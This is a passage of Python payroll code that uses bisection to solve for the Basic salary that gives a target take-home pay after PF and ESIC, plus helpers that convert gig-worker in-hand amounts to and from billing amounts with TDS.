            df, "Basic", None, "Other",
            pf_wage_cap=pf_wage_cap, apply_pf_cap=apply_pf_cap,
            pf_employee_pct=pf_employee_pct, pf_employer_pct=pf_employer_pct,
            esic_threshold=esic_threshold,
            esic_employee_pct=esic_employee_pct, esic_employer_pct=esic_employer_pct,
        )
        return result.iloc[0]

    low, high = 0.0, max(target_net * 2.0, target_net + 100000.0) + 100000.0
    mid = low
    row = net_for_basic(high)
    if row["Net Pay (Employee Take-home)"] < target_net:
        high *= 3  # safety expansion if target is unreachable within initial bound

    for _ in range(max_iterations):
        mid = (low + high) / 2
        row = net_for_basic(mid)
        net = row["Net Pay (Employee Take-home)"]
        if abs(net - target_net) <= tolerance:
            break
        if net < target_net:
            low = mid
        else:
            high = mid

    final_row = net_for_basic(mid)
    return {
        "Basic": mid,
        "Gross": final_row["Gross Salary"],
        "row": final_row,
    }


def gig_inhand_to_billing(inhand_amount: float, tds_pct: float = 1.0) -> dict:
    """Forward: worker's in-hand payment -> billing amount (Amount + TDS)."""
    tds_amount = inhand_amount * tds_pct / 100
    return {
        "In-Hand Amount": inhand_amount,
        "TDS Amount": tds_amount,
        "Billing Amount": inhand_amount + tds_amount,
    }


def gig_billing_to_inhand(billing_amount: float, tds_pct: float = 1.0) -> dict:
    """Reverse: known billing amount -> worker's in-hand payment.
    Since Billing = Amount * (1 + tds%/100), Amount = Billing / (1 + tds%/100).
    """
    inhand = billing_amount / (1 + tds_pct / 100)
    return {
        "Billing Amount": billing_amount,
        "TDS Amount": billing_amount - inhand,
        "In-Hand Amount": inhand,
    }
